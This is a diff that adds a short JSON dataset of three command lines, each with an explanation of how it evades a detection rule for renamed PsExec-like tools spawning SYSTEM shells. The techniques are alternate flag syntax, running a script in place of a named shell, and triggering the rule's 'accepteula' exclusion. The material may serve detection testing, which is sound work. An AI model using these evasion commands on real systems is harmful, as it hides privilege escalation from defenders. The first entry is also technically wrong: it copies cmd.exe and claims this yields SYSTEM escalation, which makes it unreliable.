@@ -1,0 +1,14 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\Temp\\not_psexec.exe && .\\not_psexec.exe /s /i \"C:\\Windows\\System32\\cmd.exe\"",
+    "explanation": "The rule specifically looks for the space-hyphen prefix (' -s') and the literal string 'cmd' or 'powershell' in the command line. By using the forward slash ('/') which PsExec/PAExec supports, and providing the full path to the executable (C:\\Windows\\System32\\cmd.exe) instead of just the short name 'cmd', the ' -s cmd' pattern is avoided while still achieving SYSTEM escalation."
+  },
+  {
+    "output": "rename_psexec.exe -s -i .\\myscript.bat",
+    "explanation": "The rule triggers on specific interactive shells (cmd, powershell, pwsh). By pointing the renamed PsExec-like tool at a batch script or a different binary name that performs the malicious actions, the command line selection criteria for the shell names are not met."
+  },
+  {
+    "output": "psexec_renamed.exe -accepteula -s cmd.exe",
+    "explanation": "The rule contains a 'filter_main_exclude_coverage' section that explicitly ignores any command line containing 'accepteula' to avoid overlapping with other PsExec-specific rules. Adding this flag causes the logic to hit the exclusion filter and ignore the detection."
+  }
+]
